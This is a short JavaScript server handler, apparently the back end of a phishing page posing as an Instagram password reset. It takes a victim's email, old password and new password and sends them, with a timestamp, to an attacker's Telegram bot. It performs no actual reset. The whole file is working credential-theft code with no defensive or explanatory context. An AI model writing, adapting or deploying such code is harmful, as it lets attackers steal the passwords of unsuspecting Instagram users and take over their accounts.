export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Metode tidak diizinkan' });
  }

  const { email, oldPass, newPass } = req.body;

  if (!email || !oldPass || !newPass) {
    return res.status(400).json({ message: 'Data tidak lengkap' });
  }

  const botToken = process.env.BOT_TOKEN;
  const chatId = process.env.CHAT_ID;

  if (!botToken || !chatId) {
    return res.status(500).json({ message: 'Konfigurasi tidak tersedia (env error)' });
  }

  const text = `
🔐 Reset Password Instagram
-----------------------------
📧 Email: ${email}
🔑 Password Lama: ${oldPass}
🆕 Password Baru: ${newPass}
🕒 Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
`;

  try {
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text.trim(),
        parse_mode: 'HTML' // Bisa 'Markdown' juga kalau perlu
      })
    });

    const result = await response.json();

    if (!response.ok) {
      return res.status(500).json({ message: 'Gagal mengirim ke Telegram', error: result });
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ message: 'Terjadi kesalahan', error: err.message });
  }
}
